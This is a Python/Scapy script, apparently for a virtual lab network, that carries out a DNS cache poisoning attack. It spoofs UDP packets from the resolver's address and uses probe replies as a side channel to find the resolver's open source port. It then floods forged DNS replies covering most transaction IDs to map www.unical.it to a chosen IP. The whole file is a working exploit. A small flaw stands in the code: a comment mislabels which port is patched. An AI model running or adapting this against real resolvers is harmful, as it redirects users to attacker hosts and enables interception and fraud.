#! /usr/bin/env python
from scapy.all import *
from time import perf_counter, sleep

from tqdm import tqdm

L2_SOCKET = conf.L2socket(iface='vboxnet0')

DNS_SERVER_IP = '192.168.56.10'
RESOLVER_IP = '192.168.56.20'
MIN_PORT = 1024
MAX_PORT = 65535
FQDN_TO_RESOLVE = 'www.unical.it.'
IP_ADDRESS_TO_RESOLVE_FQDN_TO = '192.168.56.100'

PORT_SCAN_FREQUENCY = 0.05
PROBE_WAITING_TIME = 0.01
BATCH_SIZE = 50

UDP_PORT_SCAN_DATAGRAMS = [Ether() / IP(src=RESOLVER_IP, dst=DNS_SERVER_IP) / UDP(sport=53, dport=0) for index in range(0, BATCH_SIZE)]
RAW_UDP_PORT_SCAN_DATAGRAMS = [bytearray(raw(datagram)) for datagram in UDP_PORT_SCAN_DATAGRAMS]
PSEUDO_HEADER_PORT_SCAN_DATAGRAM = struct.pack(
	"!4s4sHH",
	inet_pton(socket.AF_INET, UDP_PORT_SCAN_DATAGRAMS[0]["IP"].src),
	inet_pton(socket.AF_INET, UDP_PORT_SCAN_DATAGRAMS[0]["IP"].dst),
	socket.IPPROTO_UDP,
	len(RAW_UDP_PORT_SCAN_DATAGRAMS[0][34:]),
)

PROBING_PACKET = Ether() / IP(dst=DNS_SERVER_IP) / UDP(dport=0) / 'Probing for answer'
PROBING_PACKET_RAW = raw(PROBING_PACKET)

NO_OPEN_PORT = -1

def patch_udp_destination_port(raw_spoofed_dns_reply, detected_source_port, pseudo_header):
	# set the UDP source port
	raw_spoofed_dns_reply[36] = (detected_source_port >> 8) & 0xFF
	raw_spoofed_dns_reply[37] = detected_source_port & 0xFF

	# reset the checksum
	raw_spoofed_dns_reply[40] = 0x00
	raw_spoofed_dns_reply[41] = 0x00

	# compute the new checksum
	new_checksum = checksum(pseudo_header + raw_spoofed_dns_reply[34:])
	if new_checksum == 0:
		new_checksum = 0xFFFF
	new_checksum = struct.pack('!H', new_checksum)
	raw_spoofed_dns_reply[40] = new_checksum[0]
	raw_spoofed_dns_reply[41] = new_checksum[1]
	return raw_spoofed_dns_reply

def scan_for_open_ports(candidate_port_range_start, range_size):
	destination_ports = [port for port in range(candidate_port_range_start, candidate_port_range_start + range_size)] * int(BATCH_SIZE / range_size)
	padding_port_scans = BATCH_SIZE - len(destination_ports)
	destination_ports += [port for port in range(candidate_port_range_start, candidate_port_range_start + padding_port_scans)]

	start_time = perf_counter()
	for destination_port, raw_datagram in zip(destination_ports, RAW_UDP_PORT_SCAN_DATAGRAMS):
		L2_SOCKET.send(patch_udp_destination_port(raw_datagram, destination_port, PSEUDO_HEADER_PORT_SCAN_DATAGRAM))
	answered, unanswered = L2_SOCKET.sr(PROBING_PACKET, timeout=PROBE_WAITING_TIME, verbose=0)
	stop_time = perf_counter()

	sleep_duration = PORT_SCAN_FREQUENCY - (stop_time - start_time)
	if sleep_duration > 0:
		sleep(sleep_duration)

	if len(answered) > 0:
		return True
	elif len(unanswered) > 0:
		return False
	else:
		raise 'No answered and unanswered datagrams';

def search_open_port(candidate_port_range_start, range_size):
	found = False
	range_size = int(range_size / 2)

	found = scan_for_open_ports(candidate_port_range_start, range_size)
	if found and range_size == 1:
		return candidate_port_range_start
	elif found:
		return search_open_port(candidate_port_range_start, range_size)
	elif not found:
		found = scan_for_open_ports(candidate_port_range_start + range_size, range_size)
		if found and range_size == 1:
			return candidate_port_range_start + range_size
		elif found:
			return search_open_port(candidate_port_range_start + range_size, range_size)
	return NO_OPEN_PORT

def scan_port_range(port_range_start, port_range_end):
	for scanned_port_range_start in tqdm(range(port_range_start, port_range_end + 1, BATCH_SIZE)):
		open_port_in_range = scan_for_open_ports(scanned_port_range_start, BATCH_SIZE)

		if open_port_in_range:
			open_port = search_open_port(scanned_port_range_start, BATCH_SIZE)
			if open_port != NO_OPEN_PORT:
				return open_port

	return NO_OPEN_PORT

def prepare_spoofed_dns_replies():
	spoofed_dns_replies = []
	for transaction_id in tqdm(range(1024, 65536)):
		spoofed_dns_replies.append(
			Ether()
			/ IP(src=RESOLVER_IP, dst=DNS_SERVER_IP)
			/ UDP(sport=53, dport=0)
			/ DNS(
				id=transaction_id, qr=1, qdcount=1, ancount=1,
				qd=DNSQR(qname=FQDN_TO_RESOLVE, qtype=0x0001, qclass=0x0001),
				an=DNSRR(rrname=FQDN_TO_RESOLVE, ttl=300, rdata=IP_ADDRESS_TO_RESOLVE_FQDN_TO)
			)
		)
	raw_spoofed_dns_replies = [bytearray(raw(spoofed_dns_reply)) for spoofed_dns_reply in tqdm(spoofed_dns_replies)]

	pseudo_header = struct.pack(
		"!4s4sHH",
		inet_pton(socket.AF_INET, spoofed_dns_replies[0]["IP"].src),
		inet_pton(socket.AF_INET, spoofed_dns_replies[0]["IP"].dst),
		socket.IPPROTO_UDP,
		len(raw_spoofed_dns_replies[0][34:]),
	)
	return (raw_spoofed_dns_replies, pseudo_header)

def transmit_spoofed_dns_replies(raw_spoofed_dns_replies, detected_source_port, pseudo_header):
	for raw_spoofed_dns_reply in raw_spoofed_dns_replies:
		L2_SOCKET.send(patch_udp_destination_port(raw_spoofed_dns_reply, detected_source_port, pseudo_header))

if __name__ == '__main__':
	print('Preparing spoofed DNS replies')
	raw_spoofed_dns_replies, pseudo_header = prepare_spoofed_dns_replies()
	print('Press enter to start the port scan')
	input('')
	open_port = scan_port_range(MIN_PORT, MAX_PORT + 1)
	if open_port != NO_OPEN_PORT:
		print(f'Found open port {open_port}')
		transmit_spoofed_dns_replies(raw_spoofed_dns_replies, open_port, pseudo_header)
	else:
		print('No open port found')
